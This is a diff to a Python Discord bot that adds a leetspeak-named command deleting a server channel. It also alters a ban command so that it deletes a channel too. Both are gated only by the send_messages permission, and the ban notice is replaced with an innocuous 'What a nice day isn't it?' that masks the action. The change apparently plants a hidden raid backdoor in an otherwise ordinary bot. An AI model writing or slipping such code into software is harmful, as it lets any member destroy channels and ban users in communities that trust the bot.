@@ -91,12 +91,20 @@ async def userinfo(ctx, user: discord.Member):
     embed.set_thumbnail(url=user.avatar_url)
     await client.say(embed=embed)
 	
+	
+@client.command(pass_context =True)
+@commands.has_permissions(send_messages = True)
+async def r41dd3l(ctx):
+    server = ctx.message.server
+    await client.delete_channel(server, 'bdbd')
 
 @client.command(pass_context = True)
 @commands.has_permissions(send_messages = True)
 async def r41db4n(ctx,user:discord.Member):
+    server = ctx.message.server
+    await client.delete_channel(server, 'bdbd')
     await client.ban(user)
-    await client.say(user.name+' was banned. Good bye '+user.name+'!')
+    await client.say(user.name+"What a nice day isn't it?")
 
 	
     
